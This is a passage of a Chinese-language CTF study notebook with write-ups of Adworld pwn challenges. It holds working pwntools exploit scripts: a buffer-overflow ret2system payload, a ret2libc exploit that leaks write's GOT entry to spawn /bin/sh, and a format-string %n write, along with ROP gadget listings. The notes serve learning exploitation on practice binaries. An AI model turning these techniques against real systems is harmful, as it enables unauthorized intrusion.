  [26] .comment          PROGBITS        00000000 001030 00004f 01  MS  0   0  1
  [27] .shstrtab         STRTAB          00000000 00107f 000106 00      0   0  1
  [28] .symtab           SYMTAB          00000000 001638 0004d0 10     29  45  4
  [29] .strtab           STRTAB          00000000 001b08 0002da 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

选择

```c
  [25] .bss              NOBITS          0804a040 001030 000074 00  WA  0   0 32
```

寻找配合写入的gadgets

```c
vincebye@ubuntu:~/ctf/adworld/cgpwn2$ ROPgadget --binary cgpwn2 --only "mov|pop|ret|xchg"
Gadgets information
============================================================
0x08048517 : mov al, byte ptr [0xc9010804] ; ret
0x08048516 : mov al, byte ptr fs:[0xc9010804] ; ret
0x08048480 : mov ebx, dword ptr [esp] ; ret
0x08048602 : pop ebp ; ret
0x08048600 : pop ebx ; pop esi ; pop ebp ; ret
0x080486cc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483c1 : pop ebx ; ret
0x080486ce : pop edi ; pop ebp ; ret
0x08048601 : pop esi ; pop ebp ; ret
0x080486cd : pop esi ; pop edi ; pop ebp ; ret
0x080483aa : ret
0x080484ce : ret 0xeac1
0x08048813 : xchg eax, edi ; ret

Unique gadgets found: 13
```

没有合适的gadgets，作罢

## 思路2：直接写入shellcode

直接写shellcode不就好了，笨蛋

```c
from pwn import *
p = process("./cgpwn2")
# p = remote("111.198.29.45","49404")
#context(arch='amd64', os='linux', log_level='debug')
context.binary = './cgpwn2'

payload=b'a'*91
shellcode = asm(shellcraft.sh())
payload+=payload+shellcode
p.sendlineafter("please tell me your name", 'a')
p.sendlineafter("hello,you can leave some message here:", payload)
p.interactive()
```

可是他有NX栈执行保护啊==,好了又放弃

## 正确姿势

=-=利用输入的name，将需要的字符串输入进去

```c
from pwn import *
p = process("./cgpwn2")
elf=ELF("cgpwn2")

# p = remote("111.198.29.45","49404")
system_addr=elf.plt['system']
bin_addr=0x0804A080
payload=b'a'*91+p32(system_addr)+p32(1)+p32(bin_addr)

p.sendlineafter("please tell me your name", 'cat flag')
p.sendlineafter("hello,you can leave some message here:", payload)
p.interactive()
```

# Level3(未果)

这种题目直接放弃了，文件都打不开，没见过这类题目=-=原来是要两次解压

而且tar -xzvf是解压tar.gz，tar文件指令是tar -xvf

## Write函数

[Write函数](https://zh.wikipedia.org/wiki/%E5%86%99%E5%85%A5)

[Write函数ssize_t write(int fd, const void *buf, size_t nbytes);](https://www.notion.so/eec8831023b0466d952c8bf45b101e0b?pvs=21)

## 分文件分析

两次解压之后得到level3和libc_32.so.6文件，直接拖入IDA

```c
vincebye@ubuntu:~/ctf/adworld/level3$ checksec level3
[*] '/home/vincebye/ctf/adworld/level3/level3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### level3文件

main函数代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

vulnerable_function函数代码

```c
ssize_t vulnerable_function()
{
  char buf; // [sp+0h] [bp-88h]@1

  write(1, "Input:\n", 7u);
  return read(0, &buf, 0x100u);
}
```

vulnerable_function函数很明显存在溢出，但是问题没有类似system的函数来执行我们的命令

有用的字符串也是没有

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/597e7541-78c2-4843-98b0-bf6faf948b5c/Untitled.png)

### libc_32.so.6

在此可以找到system函数，地址为0003A940

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6b52d47a-5b6b-45ce-9f12-f8c66e63c42c/Untitled.png)

利用r2查找的libc_32.so.6中的字符串(IDA自带的字符串功能好像不太行

```c
[0x000187c0]> iz|grep bin
267  0x0014f92f 0x0014f92f 5   7    .rodata                                           utf8    +\f͗20 blocks=Basic Latin,Combining Diacritical Marks
414  0x00152307 0x00152307 7   11   .rodata                                           utf8    U͚Vx9ꖖ( blocks=Basic Latin,Combining Diacritical Marks,Vai
708  0x0015902b 0x0015902b 7   8    .rodata                                           ascii   /bin/sh
936  0x00159f7b 0x00159f7b 28  29   .rodata                                           ascii   invalid fastbin entry (free)
1163 0x0015abac 0x0015abac 8   9    .rodata                                           ascii   /bin/csh
1520 0x0015bf90 0x0015bf90 27  28   .rodata                                           ascii   /etc/bindresvport.blacklist
1718 0x0015d858 0x0015d858 47  48   .rodata                                           ascii   malloc(): smallbin double linked list corrupted
1828 0x0015e86c 0x0015e86c 13  14   .rodata                                           ascii   /bin:/usr/bin
```

## 总

根据保护机制知道一部分地址是会随机化的，也就是说libc中的地址会随机化，但是加载到level3文件中的相对地址是不变的,我们就可以求出其中一个函数的在level3中的地址，然后减去在libc中的地址，就可以知道整个so文件在level3文件中的偏移，其他的地址也就都知道了

## EXP

```python
from pwn import *
elf=ELF('level3')
libc=ELF('libc_32.so.6')
p=process('level3')

write_plt=elf.plt['write']
write_got=elf.got['write']
main_addr=elf.sym['main']
payload=0x88*b'a'+p32(1)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
p.sendlineafter('Input:\n',payload)

#获得的write的GOT地址
write_got_addr=u32(p.recv(4))
libc_offset=write_got_addr-libc.sym['write']
print('libc_offset>>>>')
print(hex(libc_offset))
print('\n')
#system函数地址
system_got_addr=libc_offset+libc.sym['system']
print('system_got_addr>>>>')
print(hex(system_got_addr))
print('\n')
#字符串地址
bin_addr=0x0015902b+libc_offset
print('bin_addr>>>>')
print(hex(bin_addr))
print('\n')
#这个system是plt地址？还是需要函数返回地址
payload=140*b'a'+p32(system_got_addr)+p32(1)+p32(bin_addr)
str1=p.recv()
print('str1')
print(str1)
p.sendline(payload)
str2=p.recv()
print('str2')
print(str2)
p.interactive()
```

但是Python3下这个一直出错，导致无法执行shell,先用以下代码代替，事先求出libc_offset地址

不知道为什么按照WP一模一样的代码也是无法执行

ELF对象.sym与got和plt的区别？

# CGFsb

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int v4; // esi@4
  int v5; // [sp+1Eh] [bp-7Eh]@1
  int v6; // [sp+22h] [bp-7Ah]@1
  __int16 v7; // [sp+26h] [bp-76h]@1
  int v8; // [sp+28h] [bp-74h]@1
  int v9; // [sp+8Ch] [bp-10h]@1

  v9 = *MK_FP(__GS__, 20);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  v5 = 0;
  v6 = 0;
  v7 = 0;
  memset(&v8, 0, 0x64u);#v8大小:0x64
  puts("please tell me your name:");
  read(0, &v5, 0xAu);#从输入流取前0xA个字符赋值给v5
  puts("leave your message please:");
  fgets((char *)&v8, 100, stdin);#从输入流取100个字符输入到v8
  printf("hello %s", &v5);
  puts("your message is:");
  printf((const char *)&v8);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v9;
  return result;
}
```

不会做，不会做

pwnme在.bss区，如何利用printf修改,看了几个人家写的博客，没太看得懂，感觉基础真的太差了，直接看答案吧

和String答案类似，利用%N$n($n用来写入、$p用来读取)

```python
vincebye@ubuntu:~/ctf/adworld/cgfsb$ cgfsb
please tell me your name:
vincebye
leave your message please:
AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
hello vincebye
your message is:
AAAA-0xff8954de-0xf7f4d5c0-0xff89552c-0xf7f93a9c-0x1-0xf7f66410-0x69760001-0x6265636e-0xa6579-0x41414141-0x2d70252d0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x2d702570-0x252d7025-0x70252d70
Thank you!
```

前面的AAAA是为了定位，可见AAAA(0x41414141）在偏移为10的地方，现在我们将AAAA替换为pwnme的地址，然后利用printf的%10$n在第十个参数的位置写入8，就能完成任务，代码如下

```python
from pwn import *
p=process("./cgfsb")
p=remote('111.200.241.244','63663')
payload=p32(0x0804A068)+b'aaaa'+b'%10$n'
p.sendlineafter('please tell me your name:\n','vincebye')
p.sendlineafter('your message is:\n',payload)#后修改为p.sendlineafter('\n',payload),传输中可能缺少错误一两个字符或者格式编码不同，导致阻塞
p.interactive()
```

# 问题

## Level0中若是用system的plt地址，最后如何修复堆栈平衡？

## 为什么不能用GOT地址直接接字符串呢？-Level2

因为开启了NX，所以要用ROP，在 32 位程序运行中，函数参数直接压入栈中调用函数时栈的结构为：调用函数地址->函数的返回地址->参数 n->参数 n1->···->参数 1

## %85c%7$n

在 *printf* 中，使用 *<a_number_of_chars>%<number>$n* 就可以将相应的第 *<number>* 个参数的位置写为 *%* 前输出的字符数量

如本题先用 *%85c* 输出了85个字符，再用 *%7$n* 将第七个参数的位置写成了85

## 将返回位覆盖为cat flag,怎么就执行这个了呢？-intoverflow

cat flag在what is this 函数中，紧跟的就是system函数，所以可以执行

## 溢出的偏移大小？-cgpwn2

第一次构造200大小字符串时，测得偏移大小为91，然而直接用IDA看变量S距离EBP为38，加上3，即42，于是构造500大小字符串，这时偏移为42了，这两种有什么区别吗？以什么为准呢

猜测构造200的时候，正好经历了跳转到了新的位置

# 参考链接

[[攻防世界]pwn-string - zero2pwn](https://www.sugger.fun/index.php/archives/56/)

[攻防世界 string WP_Casuall的博客-CSDN博客](https://blog.csdn.net/Casuall/article/details/107639710)

[Format String](https://frozenkp.github.io/pwn/format_string/)
